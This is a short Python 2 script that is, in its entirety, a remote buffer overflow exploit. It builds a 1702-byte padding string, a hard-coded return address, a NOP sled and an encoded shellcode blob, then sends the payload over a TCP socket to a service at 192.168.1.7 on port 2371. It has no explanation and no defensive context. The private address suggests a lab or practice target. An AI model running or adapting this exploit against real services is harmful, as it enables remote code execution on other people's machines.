#!/usr/bin/python
import sys , socket
from time import sleep


IP='192.168.1.7'
port=2371

shellcode=("\x33\xc9\xb1\x11\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x2a"
"\x8f\xf5\xb6\x83\xeb\xfc\xe2\xf4\x1b\x54\x02\x55\x79\xcc\xa6"
"\xdc\x28\x06\x14\x06\x4c\x42\x75\x25\x73\x3f\xca\x7b\xaa\xc6"
"\x8c\x4f\x42\x4f\x5d\xb7\x28\xe7\xf7\xb6\x01\xe7\x7c\x57\x9a"
"\xe9\xa5\xe7\x79\x3c\xf6\x3f\xcb\x42\x75\xe4\x42\xe1\xda\xc5"
"\x42\xe7\xda\x99\x48\xe6\x7c\x55\x78\xdc\x7c\x57\x9a\x84\x38"
"\x36")


NOP="\x90"


# module_address = 0x625012b8
# offset = 1702

buffer ='A' * 1702 + '\xb8\x12\x50\x62' + NOP * 32 + shellcode


try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((IP , port))
        
    s.send((buffer))
    s.close
    print "worked"

        
except Exception as e:
    print e
    sys.exit()